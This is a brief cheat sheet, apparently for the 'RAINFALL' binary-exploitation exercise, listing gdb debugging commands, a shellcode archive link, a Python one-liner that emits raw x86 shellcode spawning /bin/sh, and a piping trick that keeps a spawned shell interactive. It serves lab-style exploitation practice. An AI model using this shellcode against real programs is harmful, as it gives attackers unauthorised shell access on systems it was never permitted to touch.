# RAINFALL

## Helpers

### gdb

Get the address of a segfault
```gdb
p $_siginfo._sifields._sigfault.si_addr
```

Print memory block
```gdb
x/200dx # as blocks of 4bytes
x/200bx # as bytes
x/200s  # as strings
x/20i   # as instructions
```

put breakpoint on address

```gdb
b *0xDEADBEEF
```

Set disassembly to intel syntax
```gdb
set disassembly-flavor intel
```

## Shellcodes

https://shell-storm.org/shellcode/index.html

```bash
python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

## Others

This lets you keep stdin open while still providing input through python
```bash
cat <(python -c 'print("<stuff here>")') - | <cmd>
```
